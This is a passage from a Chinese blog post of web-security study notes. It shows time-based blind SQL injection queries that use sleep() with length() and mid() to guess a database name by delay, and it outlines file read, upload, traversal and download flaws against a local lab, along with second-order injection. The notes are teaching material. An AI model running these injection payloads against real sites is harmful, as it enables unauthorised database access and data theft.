<span class="token comment">#缺点会受到网络速度的影响</span>

<span class="token comment">#判断段数据库的长度，爆破</span>
<span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> member <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>mid抓取一个字符进行判断，就可以通过暴力破解数据库名mid(srt,a,b)从a位开始，抓取b个</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="3基于报错的报错错回显"><a class="markdownIt-Anchor" href="#3基于报错的报错错回显"></a> 3.基于报错的报错错回显</h3>
<h1 id="二文件操作"><a class="markdownIt-Anchor" href="#二文件操作"></a> 二.文件操作</h1>
<p><strong>1.跨目录文件的读取</strong></p>
<p><strong>2.如果读取到数据库配置文件，就会找到用户密码</strong></p>
<p><strong>3.通过工具扫目录，或者进行目录爬行，有时候读取的文件不会显示，可以通过修改源代码来达成目的</strong></p>
<p><strong>4.危害，发现目录盘的结构，配合一些操作</strong></p>
<h2 id="21网站文件"><a class="markdownIt-Anchor" href="#21网站文件"></a> 2.1网站文件</h2>
<blockquote>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220411112042.jpeg" alt=""></p>
<p><a target="_blank" rel="noopener" href="http://192.168.3.133:88/vul/dir/dir_list.php?title=truman.php">http://192.168.3.133:88/vul/dir/dir_list.php?title=truman.php</a></p>
<p>①网站域名<a target="_blank" rel="noopener" href="http://192.168.3.133:88">http://192.168.3.133:88</a>，文件夹vul/dir，文件dir_list.php，参数名itle，参数值</p>
</blockquote>
<h2 id="22文件读取"><a class="markdownIt-Anchor" href="#22文件读取"></a> 2.2文件读取</h2>
<p><strong>获取文件内容，但不可以获取目录结构</strong></p>
<p><strong>原因为程序员写代码时的不同</strong></p>
<h2 id="23文件上传高危"><a class="markdownIt-Anchor" href="#23文件上传高危"></a> 2.3文件上传（高危）</h2>
<p><strong>1.上传文件到网站目录</strong></p>
<p><strong>2.危害webshell植入后门</strong></p>
<h2 id="24目录遍历"><a class="markdownIt-Anchor" href="#24目录遍历"></a> 2.4目录遍历</h2>
<h2 id="25文件下载"><a class="markdownIt-Anchor" href="#25文件下载"></a> 2.5文件下载</h2>
<p><strong>存在文件下载的漏洞时，查看下载的地址，遍历出文件，通过…\的越级下载东西</strong></p>
<p><strong>出现在有下载的位置</strong></p>
<h1 id="三注入拓展"><a class="markdownIt-Anchor" href="#三注入拓展"></a> 三.注入拓展</h1>
<h2 id="31-加密注入"><a class="markdownIt-Anchor" href="#31-加密注入"></a> 3.1 加密注入</h2>
<p>cookie的内容是被加密过的，注入的语句是需要进行相同的加密加密方式进行加密。</p>
<h2 id="32二次注入"><a class="markdownIt-Anchor" href="#32二次注入"></a> 3.2二次注入</h2>
<p><strong>扫描工具一般是没有进行二次注入的，有源代码的测试比较可行。通过代码分析还是人工分析。</strong></p>
<blockquote>
<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
<p><strong>二次注入，可以概括为以下两步:</strong></p>
<ul>
<li>第一步：插入恶意数据<br>
进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>
<li>第二步：引用恶意数据<br>
开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>
</ul>
</blockquote>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220511231216.webp" alt=""></p>
<ul>
<li>当输入的参数在前端有长度限制可以在html里面更改，后台限制则不可更改。</li>
</ul>
<h1 id="技巧"><a class="markdownIt-Anchor" href="#技巧"></a> 技巧</h1>
<ul>
<li>明确漏洞的危害，目的与漏洞有关，漏洞提供什么样的帮助</li>
<li></li>
</ul>
</body></html>
                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Hkini</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://www.hkini.top/posts/36173.html">https://www.hkini.top/posts/36173.html</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">Hkini</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/Web%E5%AE%89%E5%85%A8/">
                                    <span class="chip bg-color">Web安全</span>
                                </a>
                            
                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
                                    <span class="chip bg-color">SQL注入</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,qzone,wechat,weibo,douban" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    
    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid="></script>
    <div class="addthis_inline_share_toolbox"></div>
    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'AcWiopK3pHt4imczk7wvUFZZ-gzGzoHsz',
        appKey: 'UxlKcVndM3aSrEzt9vM0ul6L',
        serverURLs: 'https://acwiopk3.lc-cn-n1-shared.com',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: '欢迎评论'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/posts/59029.html">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/1.png" class="responsive-img" alt="文件上传实验">
                        
                        <span class="card-title">文件上传实验</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            不同的类型文件上传的方式有所不同，对上传漏洞的分类，对不同的漏洞实行不同的方法可以实现高效率准确的上传。
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2025-05-03
                        </span>
                        
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E4%B8%93%E4%B8%9A/" class="post-category">
                                    专业
                                </a>
                            
                            <a href="/categories/%E4%B8%93%E4%B8%9A/%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE/" class="post-category">
                                    实践项目
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Web%E5%AE%89%E5%85%A8/">
                        <span class="chip bg-color">Web安全</span>
                    </a>
                    
                    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
                        <span class="chip bg-color">文件上传</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/posts/64967.html">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/20.png" class="responsive-img" alt="CSRF实验">
                        
                        <span class="card-title">CSRF实验</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            关于CSRF的实战练习。
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2025-05-03
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E4%B8%93%E4%B8%9A/" class="post-category">
                                    专业
                                </a>
                            
                            <a href="/categories/%E4%B8%93%E4%B8%9A/%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE/" class="post-category">
                                    实践项目
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Web%E5%AE%89%E5%85%A8/">
                        <span class="chip bg-color">Web安全</span>
                    </a>
                    
                    <a href="/tags/CSRF/">
                        <span class="chip bg-color">CSRF</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: Hkini<br />'
            + '文章作者: Hkini<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>



<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('2'),
            // headingSelector: 'h1, h2, h3, h4, h5, h6'
            headingSelector: 'none',
        });
        var tocList = $('<ol>', { class: 'toc-list' }); // 创建顶层 <ol> 容器
        var currentLevel = 1; // 当前层级
        var parentStack = [tocList]; // 用于存储父级 <ol> 的栈

        $('#articleContent').find('h1, h2, h3, h4, h5, h6').each(function () {
            var $heading = $(this);
            var headingText = $heading.text();
            var level = parseInt($heading[0].tagName[1], 10); // 获取当前标题的层级，例如 h1 -> 1, h2 -> 2
            
            // var tocList = $('<ol>', { class: 'toc-list ' }); // 创建 <ol> 容器
            var tocListItem = $('<li>', { class: 'toc-list-item' }); // 创建 <li> 容器

            var tocItem = $('<a>', { 
                href: '#' + $heading.attr('id'), 
                class: 'toc-link' // 添加 class="toc-link"
            }).text(headingText); // 创建 <a> 标签

            // 创建箭头 SVG
            var arrowSvg = `<svg class="arrow-icon" xmlns="http://www.w3.org/2000/svg" fill="none" version="1.1" viewBox="0 0 24 24" class="h-[0.96em] w-[0.96em] text-foreground" style="transition: transform 233ms cubic-bezier(0.42, 0, 0.24, 1); transform: rotate(0deg);"><path d="m18.707 9.7075 4e-4 -3.75e-4q0.1407-0.14065 0.2168-0.32442 0.0761-0.18377 0.0761-0.38268t-0.0761-0.38268q-0.0761-0.18377-0.2168-0.32442-0.1406-0.14065-0.3244-0.21677-0.1838-0.07612-0.3827-0.07612t-0.3827 0.076121q-0.1838 0.07612-0.3244 0.21677l-4e-4 3.75e-4 -5.2925 5.2925-5.2929-5.2929q-0.14065-0.14065-0.32442-0.21677-0.18377-0.07612-0.38268-0.07612t-0.38268 0.07612q-0.18377 0.076121-0.32442 0.21677t-0.21677 0.32442q-0.07612 0.18377-0.07612 0.38268t0.07612 0.38268q0.076121 0.18377 0.21677 0.32442l6 6q0.14066 0.14065 0.32443 0.21677 0.18377 0.07612 0.38268 0.07612t0.38268-0.07612q0.18377-0.07612 0.32443-0.21677l5.9996-5.9996z" fill="currentColor" fill-rule="evenodd"></path></svg>`;

            // 包裹 <a> 标签的 <div>
            var tocItemWrapper = $('<div>', { 
                class: 'toc-item-wrapper' // 添加 class="toc-item-wrapper"
            }).append(tocItem).append(arrowSvg); // 将 <a> 添加到 <div>

            // 为 TOC 项添加相应的缩进
            // tocItem.css('padding-left', (level - 1) * 20 + 'px');

            // 将 <a> 添加到 <li>
            tocListItem.append(tocItemWrapper);
             // 如果当前标题层级比上一个标题层级高，创建新的嵌套 <ol>
                if (level > currentLevel) {
                var nestedList = $('<ol>', { class: 'toc-list' }); // 创建嵌套的 <ol>
                parentStack[parentStack.length - 1].children('li:last').append(nestedList); // 将嵌套 <ol> 添加到父级 <li>
                parentStack.push(nestedList); // 将嵌套 <ol> 压入栈
            } 
            // 如果当前标题层级比上一个标题层级低，回退到正确的父级
            else if (level < currentLevel) {
                while (level < currentLevel) {
                    parentStack.pop(); // 弹出栈顶，回退到上一级
                    currentLevel--;
                }
            }

            // 将当前 <li> 添加到当前层级的 <ol>
            parentStack[parentStack.length - 1].append(tocListItem);
            currentLevel = level; // 更新当前层级
      
           
            
            // 查找该标题下的 evoldown 内容（#d, #e, #t, #c, #v, #a）
            $heading.nextUntil('h1, h2, h3, h4, h5, h6').each(function () {
                var $div = $(this);
                if ($div.hasClass('evoldown')) {
                    var type = $div.attr('type');
                    var id = $div.attr('id');
                    var label = $div.text(); // 假设需要从内容中提取 label
                    var icon = '';

                    // 根据类型插入相应的图标
                    switch (type) {
                        case 'd':
                            icon = '<svg type="d" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="0" stroke-linecap="round" stroke-linejoin="round" version="1.1" aria-hidden="true" class=""><path d="m21.15 6.85c0-2.2056-1.7944-4-4-4-4.1765-0.01989-5.4993 5.7322-1.8147 7.5629-0.263 0.63631-0.4627 1.4421-0.6559 2.2215-0.1397 0.56337-0.2841 1.1459-0.4405 1.6084-0.0728 0.2155-0.1286 0.4813-0.1891 0.4813-0.5072-0.7362-0.8126-2.2507-1.0979-3.3161-0.47879-1.5358-0.72936-4.4237-2.8018-4.558-0.77422 7e-5 -1.3844 0.52253-1.8138 1.553-0.55019 1.254-0.75064 3.2421-1.3784 4.4472-0.39648 3e-4 -0.79576 0.0045-1.1877 0.0703-0.67978 0.1073-1.3339 0.4195-1.798 0.9347-0.39707 0.4315-0.6427 0.9874-0.74275 1.5623-0.063545 0.351-0.07691 0.7094-0.07883 1.0654 0.001935 0.4718-0.01324 0.9457 0.027745 1.4163 0.09435 1.151 0.65732 2.1308 1.7281 2.6237 0.43467 0.1975 0.91053 0.2877 1.3854 0.3129 0.40096 0.0215 0.80345 0.0129 1.2048 0.0139 0.6491 2e-4 1.2891-0.0515 1.888-0.3229 0.90042-0.4067 1.4845-1.2039 1.6712-2.1666 0.0761-0.3779 0.09179-0.7654 0.09344-1.15 7.7e-4 -0.2699 0.00148-0.5413-7.8e-4 -0.8111-0.00379-0.4854-0.04143-0.9771-0.19121-1.4414-0.28748-0.9172-0.98053-1.616-1.8964-1.909 0.43984-1.1576 0.66815-2.7594 1.1268-3.8895 0.3537 0.72804 0.57113 1.7669 0.82283 2.7298 0.26567 1.0724 0.5404 2.1814 0.90896 3.0557 0.87204 2.2985 3.1124 2.7586 4.0452 0.392 0.5508-1.2642 0.7508-3.279 1.3828-4.4916 2.1142-0.10339 3.8024-1.8557 3.8024-3.995zm-12.073 8.8023c0.05605 0.2275 0.06623 0.465 0.07092 0.6983 0.00363 0.2444 0.00195 0.4906 0.00214 0.735-0.0063 0.408 0.01486 0.882-0.18359 1.2496-0.24573 0.4539-0.8026 0.501-1.2651 0.5114-0.33714 0.0058-0.67525 0.0041-1.0124 0.0018-0.46455-0.0092-1.0361-0.0245-1.3192-0.4545-0.16612-0.2552-0.19733-0.5702-0.21202-0.8673-0.01004-0.2443-0.00683-0.4906-0.0075-0.735 5.9e-4 -0.2322-0.00201-0.4664 0.01171-0.6983 0.01886-0.2936 0.06332-0.6069 0.24969-0.8453 0.34185-0.4331 1.0226-0.3889 1.5228-0.3979 0.38828 0.0035 0.77905-0.0131 1.1658 0.0285 0.49865 0.0566 0.85211 0.2621 0.97684 0.7737zm8.0732-6.8023c-2.6379-0.06696-2.6373-3.9334 0-4 2.6378 0.06697 2.6373 3.9334 0 4z" fill="currentColor"></path></svg>'; // 填入 #d 对应的 SVG 图标
                            break;
                        case 'e':
                            icon = '<svg type="e" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="0" stroke-linecap="round" stroke-linejoin="round" version="1.1" aria-hidden="true" class=""><path fill="currentColor" d="m21.9 15.621c0.1248-1.8535-0.6087-3.4099-2.6058-3.8292-0.7712-0.15744-1.3921-0.13977-2.1113-0.14543-0.6323 0.0048-1.1718-0.01567-1.8401 0.03203 1.5356-0.8078 1.6998-2.205 1.6567-3.546 0.1272-2.3708-1.4685-3.666-3.7727-3.673-2.2427-0.04024-5.0463-0.27229-5.9443 1.9172-0.28083 0.6692-0.27606 1.2179-0.28202 1.6587-0.08527 1.4303 0.20687 2.9224 1.662 3.6429-2.3051-0.05275-5.3273-0.39212-6.28 1.8983-0.28073 0.66862-0.27595 1.2174-0.282 1.6572-0.10329 1.6061 0.3059 3.171 2.0252 3.8067 1.2061 0.4187 2.2175 0.2869 3.3945 0.3134 2.0524 0.0901 4.0448-0.4637 4.4796-2.4982 0.609 2.5638 3.2086 2.5463 5.3204 2.4982 2.7823 0.1278 4.7024-0.9368 4.5798-3.7329zm-12.899-7.6287c-0.14889-1.8665 1.8839-1.4921 3.1358-1.546 0.8939 0.05358 2.4743-0.21158 2.8003 0.88445 0.2729 2.4494-0.0297 2.8555-2.5242 2.8232-0.94713-0.07259-2.869 0.28949-3.3134-0.77077-0.14881-0.44557-0.08538-0.92893-0.09846-1.3909zm0.2606 9.2128c-0.56638 0.162-1.1652 0.1412-1.7487 0.1488-0.59786-0.0036-1.1977 0.0131-1.7948-0.0233-0.93407-0.0365-1.6776-0.3579-1.6157-1.4217 0.01574-0.5119-0.06845-1.0551 0.11822-1.5436 0.4432-0.84155 1.5978-0.6728 2.4032-0.7191 0.81712 0.01614 1.6464-0.05154 2.4536 0.10154 0.99382 0.17537 1.0564 0.91742 1.0227 1.7752-6.1e-4 0.7729 0.04085 1.416-0.83867 1.6821zm2.9212-3.6286c-0.0836 0.19457-0.14194 0.3848-0.18279 0.56614-0.18535-0.87758-0.76293-1.6189-1.5605-2.02 1.0871 0.04933 2.0387 0.04959 3.1216-8e-5 -0.7672 0.39034-1.1687 0.96486-1.3783 1.4539zm6.8788 3.6286c-0.5664 0.162-1.1652 0.1412-1.7488 0.1488-0.5978-0.0036-1.1977 0.0131-1.7947-0.0233-0.9341-0.0365-1.6776-0.3579-1.6157-1.4217 0.0157-0.5119-0.0685-1.0551 0.1182-1.5436 0.4432-0.84155 1.5978-0.6728 2.4033-0.7191 0.8171 0.01614 1.6464-0.05154 2.4536 0.10154 0.9938 0.17537 1.0563 0.91742 1.0227 1.7752-6e-4 0.7729 0.0409 1.416-0.8386 1.6821z"></path></svg>'; // 填入 #e 对应的 SVG 图标
                            break;
                        case 't':
                            icon = '<svg type="t" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="0" stroke-linecap="round" stroke-linejoin="round" version="1.1" aria-hidden="true" class=""><path d="m15.385 10.538c-0.52922 1.222-0.74082 3.1121-1.2852 4.3107-0.06906-2e-5 -0.24102-0.40954-0.40553-0.85764-0.54849-1.4968-0.91293-3.7816-1.4977-5.2179-0.49825-1.7178-2.7313-2.8836-3.8104-0.24557-0.55221 1.2498-0.75261 3.2793-1.3921 4.4683-0.45354 0.09492-0.79418 0.49706-0.79418 0.9788 0 0.5523 0.4477 1 1 1 0.77414 0 1.3844-0.52246 1.8137-1.5529 0.50969-1.1819 0.73444-2.9587 1.2241-4.138 0.07175 2e-5 0.14687 0.33291 0.23664 0.59492 0.20698 0.60425 0.39119 1.3477 0.58618 2.1349 0.2657 1.0724 0.54043 2.1814 0.90899 3.0557 0.87212 2.2985 3.1123 2.7586 4.0452 0.39202 0.55283-1.2608 0.75203-3.309 1.3936-4.5083 0.4522-0.0959 0.7915-0.49744 0.7915-0.97823 0-0.55229-0.4477-1-1-1-0.7755 0-1.3861 0.526-1.8148 1.5634z" fill="currentColor"></path><path d="m15.802 6.9697c-0.1557 0.1946-0.1882 0.58884 0.1331 0.60533 1.2616 0.02168 2.5193 0.48654 3.5913 1.2655 0.2705 0.19453 0.6808 0.05368 0.7176-0.30435 0.0793-0.76097 0.0572-1.5713-0.086-2.401-0.1456-0.82752-0.4109-1.6736-0.8018-2.5036-0.1536-0.34251-0.6624-0.55548-0.9204-0.23779l-0.7238 0.98277c-3.8989-2.9446-9.692-2.2836-12.827 1.4659-6.4518 7.8165 1.8281 18.818 11.123 14.783 1.8924-0.8564 3.4853-2.3528 4.4507-4.1927 0.0679-0.1218 0.1291-0.2481 0.1823-0.377 0.1017-0.2304 